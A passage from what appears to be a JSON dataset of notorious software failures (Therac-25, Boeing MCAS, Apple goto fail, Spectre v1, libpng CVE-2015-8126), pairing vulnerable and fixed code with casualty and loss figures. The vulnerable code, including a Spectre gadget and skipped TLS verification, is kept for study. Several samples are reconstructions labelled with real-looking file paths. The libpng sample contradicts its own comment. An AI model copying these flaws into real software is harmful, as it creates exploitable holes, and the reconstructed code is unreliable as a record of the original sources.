      "after_code": "; Fixed version with proper synchronization\n\nMODE_SELECT:\n    ; CRITICAL SECTION - disable interrupts\n    DISABLE_INTERRUPTS\n    \n    CALL READ_KEYBOARD\n    STORE MODE_REQUESTED\n    \n    ; Clear ready flag before any movement\n    CLEAR BEAM_READY_FLAG\n    \n    ; Atomic check-and-move\n    CALL BEGIN_TURNTABLE_ROTATION\n    \nWAIT_FOR_POSITION:\n    LOAD TURNTABLE_POSITION\n    COMPARE EXPECTED_POSITION\n    JUMP_NE WAIT_FOR_POSITION\n    \n    ; Verify mode matches expected BEFORE enabling\n    LOAD CURRENT_MODE\n    COMPARE MODE_REQUESTED\n    JUMP_NE MODE_MISMATCH_ERROR\n    \n    ; Additional hardware interlock check\n    LOAD HARDWARE_INTERLOCK_STATUS\n    COMPARE INTERLOCK_SAFE\n    JUMP_NE INTERLOCK_ERROR\n    \n    SET BEAM_READY_FLAG\n    ENABLE_INTERRUPTS\n    RETURN\n\nMODE_MISMATCH_ERROR:\n    CALL EMERGENCY_STOP\n    CALL LOG_ERROR\n    ENABLE_INTERRUPTS\n    RETURN\n\n; FIX: Mode changes now invalidate ready state\nKEYBOARD_HANDLER:\n    ; Any mode change immediately clears ready flag\n    CLEAR BEAM_READY_FLAG\n    LOAD KEYSTROKE\n    ; ... rest of handler\n    ; Mode change triggers full re-verification",
      "language": "Assembly/PDP-11",
      "file_path": "therac25_control.asm",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "death",
      "root_cause": "race_condition",
      "complexity_score": 9,
      "deaths": 6,
      "financial_loss_usd": 0,
      "affected_systems": 11,
      "project": "AECL Therac-25",
      "year": 1987,
      "description": "A race condition in the Therac-25 radiation therapy machine allowed operators to select high-power electron beam mode while the machine was configured for X-ray mode, resulting in patients receiving radiation doses 100x higher than intended. Six patients died and many more were severely injured."
    },
    {
      "id": "boeing_737max_mcas",
      "name": "Boeing 737 MAX MCAS",
      "cve": null,
      "before_code": "// Boeing 737 MAX MCAS (Maneuvering Characteristics Augmentation System)\n// CATASTROPHIC DESIGN: Single sensor, no redundancy, no crew awareness\n\nstruct MCAS_Config {\n    // BUG: Only uses ONE AoA sensor (left side by default)\n    // 737 has TWO AoA sensors but MCAS only reads one!\n    int active_aoa_sensor;  // 0 = left, 1 = right\n    \n    float stall_threshold;  // Degrees\n    float max_adjustment;   // Originally 0.6 degrees, later increased to 2.5!\n    int adjustment_count_limit;  // BUG: No limit in original design\n};\n\nvoid mcas_adjustment(FlightState* state, MCAS_Config* config) {\n    float aoa;\n    \n    // CATASTROPHIC BUG 1: Single point of failure\n    // Only reads from one sensor, no cross-check with the other\n    if (config->active_aoa_sensor == 0) {\n        aoa = read_left_aoa_sensor();\n    } else {\n        aoa = read_right_aoa_sensor();\n    }\n    \n    // CATASTROPHIC BUG 2: No sensor validation\n    // Doesn't check if reading is plausible\n    // A stuck or failed sensor returns garbage\n    \n    // CATASTROPHIC BUG 3: No comparison between sensors\n    // The two sensors on Lion Air 610 differed by 21 degrees!\n    // System should have alerted crew, but comparison was OPTIONAL UPGRADE\n    \n    if (aoa > config->stall_threshold) {\n        float adjustment = calculate_nose_down_adjustment(aoa, state);\n        \n        // CATASTROPHIC BUG 4: Adjustment can repeat every 10 seconds\n        // Pilots fighting the system while it keeps pushing nose down\n        // Original design had lower limits, but these were increased\n        // during development without updating safety analysis\n        \n        apply_stabilizer_trim(-adjustment);\n        \n        // CATASTROPHIC BUG 5: No notification to crew\n        // Pilots don't know MCAS is activating\n        // They think they're fighting a runaway trim\n        // But the system keeps reactivating\n        \n        // BUG 6: Resets when pilots manually counter\n        // Pilots pull back -> MCAS pauses\n        // 10 seconds later -> MCAS activates again\n        // Cycle repeats until ground impact\n    }\n}\n\n// The AoA Disagree alert was available but NOT INCLUDED by default\n// Boeing sold it as an OPTIONAL UPGRADE\n// Neither Lion Air nor Ethiopian Airlines had purchased it\nbool aoa_disagree_alert_purchased = false;\n\nvoid check_aoa_disagree() {\n    if (!aoa_disagree_alert_purchased) {\n        return;  // Feature not enabled, don't warn pilots\n    }\n    // This code never ran on the crashed aircraft\n    float left = read_left_aoa_sensor();\n    float right = read_right_aoa_sensor();\n    if (abs(left - right) > 5.0) {\n        display_aoa_disagree_warning();\n    }\n}",
      "after_code": "// Fixed MCAS with proper redundancy and crew awareness\n\nvoid mcas_adjustment(FlightState* state, MCAS_Config* config) {\n    // FIX 1: Read BOTH AoA sensors\n    float aoa_left = read_left_aoa_sensor();\n    float aoa_right = read_right_aoa_sensor();\n    float aoa_diff = fabs(aoa_left - aoa_right);\n    \n    // FIX 2: Cross-check sensors - MANDATORY, not optional\n    if (aoa_diff > AOA_DISAGREE_THRESHOLD) {\n        // Alert crew immediately\n        display_aoa_disagree_warning();  // Now standard, not optional!\n        log_event(\"AOA_DISAGREE\", aoa_left, aoa_right);\n        \n        // FIX 3: DISABLE MCAS when sensors disagree\n        // Don't trust either reading\n        return;  // Exit without making adjustment\n    }\n    \n    // FIX 4: Use average of both sensors\n    float aoa = (aoa_left + aoa_right) / 2.0;\n    \n    // FIX 5: Sanity check on sensor readings\n    if (aoa < AOA_MIN_PLAUSIBLE || aoa > AOA_MAX_PLAUSIBLE) {\n        log_error(\"AOA reading out of plausible range\");\n        display_aoa_fail_warning();\n        return;\n    }\n    \n    if (aoa > config->stall_threshold) {\n        float adjustment = calculate_nose_down_adjustment(aoa, state);\n        \n        // FIX 6: Hard limit on adjustment magnitude\n        adjustment = fmin(adjustment, MAX_SINGLE_ADJUSTMENT);\n        \n        // FIX 7: Limit on cumulative adjustment\n        if (state->cumulative_mcas_adjustment > MAX_CUMULATIVE_ADJUSTMENT) {\n            log_error(\"MCAS cumulative limit reached\");\n            display_mcas_limit_warning();\n            return;\n        }\n        \n        // FIX 8: Alert crew that MCAS is activating\n        display_mcas_active_indicator();\n        \n        apply_stabilizer_trim(-adjustment);\n        state->cumulative_mcas_adjustment += adjustment;\n    }\n}",
      "language": "Unknown (likely C/C++)",
      "file_path": "mcas/flight_control.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "death",
      "root_cause": "logic_error",
      "complexity_score": 8,
      "deaths": 346,
      "financial_loss_usd": 20000000000,
      "affected_systems": 387,
      "project": "Boeing 737 MAX Flight Control",
      "year": 2019,
      "description": "The Maneuvering Characteristics Augmentation System (MCAS) in the Boeing 737 MAX relied on a single Angle of Attack (AoA) sensor. When this sensor failed, MCAS repeatedly pushed the nose down, causing two crashes (Lion Air 610 and Ethiopian 302) that killed 346 people."
    },
    {
      "id": "goto_fail_cve_2014_1266",
      "name": "Apple goto fail",
      "cve": "CVE-2014-1266",
      "before_code": "static OSStatus\nSSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, SSLBuffer signedParams,\n                                 uint8_t *signature, UInt16 signatureLen)\n{\n    OSStatus        err;\n    // ... setup code ...\n    \n    if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)\n        goto fail;\n    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)\n        goto fail;\n        goto fail;  // <-- CATASTROPHIC BUG: Duplicate goto!\n                    // This line ALWAYS executes, skipping signature verification below!\n    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)\n        goto fail;\n    \n    // SIGNATURE VERIFICATION THAT NEVER RUNS:\n    err = sslRawVerify(ctx,\n                       ctx->peerPubKey,\n                       dataToSign,\n                       dataToSignLen,\n                       signature,\n                       signatureLen);\n    // ... rest of function ...\n\nfail:\n    SSLFreeBuffer(&signedHashes);\n    SSLFreeBuffer(&hashCtx);\n    return err;  // Returns success (0) even though verification was skipped!\n}",
      "after_code": "static OSStatus\nSSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, SSLBuffer signedParams,\n                                 uint8_t *signature, UInt16 signatureLen)\n{\n    OSStatus        err;\n    // ... setup code ...\n    \n    if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)\n        goto fail;\n    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)\n        goto fail;\n    // <-- FIX: Removed duplicate goto fail\n    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)\n        goto fail;\n    \n    // Now signature verification actually runs:\n    err = sslRawVerify(ctx,\n                       ctx->peerPubKey,\n                       dataToSign,\n                       dataToSignLen,\n                       signature,\n                       signatureLen);\n    // ... rest of function ...\n\nfail:\n    SSLFreeBuffer(&signedHashes);\n    SSLFreeBuffer(&hashCtx);\n    return err;\n}",
      "language": "C",
      "file_path": "Security/libsecurity_ssl/lib/sslKeyExchange.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "logic_error",
      "complexity_score": 2,
      "deaths": 0,
      "financial_loss_usd": 0,
      "affected_systems": 100000000,
      "project": "Apple SecureTransport",
      "year": 2014,
      "description": "A duplicate 'goto fail' statement caused SSL/TLS signature verification to be skipped, allowing man-in-the-middle attacks against all iOS and macOS devices."
    },
    {
      "id": "spectre_2018",
      "name": "Spectre (Variant 1)",
      "cve": "CVE-2017-5753",
      "before_code": "/* Classic Spectre v1 vulnerable pattern */\nuint8_t array1[256];\nuint8_t array2[256 * 512];\n\nvoid victim_function(size_t x) {\n    /* This bounds check prevents out-of-bounds access */\n    /* ... except during speculative execution! */\n    \n    if (x < array1_size) {  /* Branch misprediction here */\n        /* CPU speculatively executes this with x out-of-bounds */\n        uint8_t secret = array1[x];  /* Reads secret memory! */\n        \n        /* This access leaves trace in cache */\n        uint8_t dummy = array2[secret * 512];  /* Cache probe */\n        \n        /* Even though speculation is rolled back, */\n        /* cache state reveals the secret! */\n    }\n}\n\n/* Attacker measures which array2 line is cached */\n/* to learn the value of secret */\n",
      "after_code": "/* Spectre v1 mitigated code */\n#include <linux/speculation.h>\n\nuint8_t array1[256];\nuint8_t array2[256 * 512];\n\nvoid victim_function(size_t x) {\n    /* FIX 1: Use array_index_nospec() */\n    /* This creates data dependency that blocks speculation */\n    \n    if (x < array1_size) {\n        /* Sanitize index to prevent speculative access */\n        x = array_index_nospec(x, array1_size);\n        \n        uint8_t value = array1[x];  /* Now safe */\n        uint8_t dummy = array2[value * 512];\n    }\n    \n    /* FIX 2: Use lfence barrier (slower) */\n    if (x < array1_size) {\n        asm volatile(\"lfence\" ::: \"memory\");\n        /* ... */\n    }\n    \n    /* FIX 3: Use retpoline for indirect calls */\n}",
      "language": "C",
      "file_path": "example_vulnerable.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "speculative_execution",
      "complexity_score": 10,
      "deaths": 0,
      "financial_loss_usd": 5000000000,
      "affected_systems": 3000000000,
      "project": "Intel/AMD/ARM CPUs (software mitigations)",
      "year": 2018,
      "description": "Speculative execution in modern CPUs allows attackers to read arbitrary memory by measuring cache timing side channels. Affects virtually all modern processors."
    },
    {
      "id": "libpng_cve_2015_8126",
      "name": "libpng Palette Buffer Overflow",
      "cve": "CVE-2015-8126",
      "before_code": "/* libpng pngset.c - VULNERABLE VERSION (since 1.0.0) */\nvoid PNGAPI\npng_set_PLTE(png_structrp png_ptr, png_inforp info_ptr,\n    png_const_colorp palette, int num_palette)\n{\n   /* BUG: No validation that num_palette fits bit depth!\n    * For bit_depth < 8, max palette is 2^bit_depth\n    * But this code allows up to PNG_MAX_PALETTE_LENGTH (256)\n    * regardless of bit depth.\n    * \n    * Attack: Send image with bit_depth=1 but palette with 256 entries\n    * When code iterates palette, it overflows the buffer allocated\n    * for 2^1 = 2 entries.\n    */\n   \n   if (num_palette < 0 || num_palette > PNG_MAX_PALETTE_LENGTH)\n   {\n      png_error(png_ptr, \"Invalid palette length\");\n      return;\n   }\n   \n   /* Allocates based on num_palette, not bit_depth constraint */\n   png_ptr->palette = png_voidcast(png_colorp, png_malloc(png_ptr,\n       PNG_MAX_PALETTE_LENGTH * (sizeof (png_color))));\n   \n   memcpy(png_ptr->palette, palette, num_palette * (sizeof (png_color)));\n   info_ptr->num_palette = (png_uint_16)num_palette;\n   /* ... */\n}",
      "after_code": "/* libpng pngset.c - FIXED VERSION (1.6.19+) */\nvoid PNGAPI\npng_set_PLTE(png_structrp png_ptr, png_inforp info_ptr,\n    png_const_colorp palette, int num_palette)\n{\n   int max_palette_length;\n   \n   /* FIX: Calculate maximum palette size based on bit depth */\n   if (png_ptr->bit_depth < 8)\n      max_palette_length = 1 << png_ptr->bit_depth;\n   else\n      max_palette_length = PNG_MAX_PALETTE_LENGTH;\n   \n   /* FIX: Validate against bit-depth-appropriate maximum */\n   if (num_palette < 0 || num_palette > max_palette_length)\n   {\n      if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n         png_error(png_ptr, \"Invalid palette length\");\n      else\n      {\n         png_warning(png_ptr, \"Invalid palette length\");\n         return;\n      }\n   }\n   \n   png_ptr->palette = png_voidcast(png_colorp, png_malloc(png_ptr,\n       max_palette_length * (sizeof (png_color))));\n   \n   memcpy(png_ptr->palette, palette, num_palette * (sizeof (png_color)));\n   info_ptr->num_palette = (png_uint_16)num_palette;\n   /* ... */\n}",
      "language": "C",
      "file_path": "pngset.c",
      "commit_introducing": null,
      "commit_fixing": "d9006f683fb6e4918da1b07f8c5f654bfa68df7f",
      "repo_url": "https://github.com/glennrp/libpng",
      "category": "security",
      "root_cause": "buffer_overflow",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 100000000,
      "affected_systems": 1000000000,
      "project": "libpng",
      "year": 2015,
      "description": "A buffer overflow in libpng's palette handling existed since version 1.0.0. The code never validated that the palette size fit the image's bit depth. For images with bit_depth < 8, attackers could specify oversized palettes causing buffer overflows. This is a classic 'architectural flaw' - the bug was present for ~20 years before discovery.",
      "architectural_flaw": true,
      "latency_years": 20
    }
  ]
}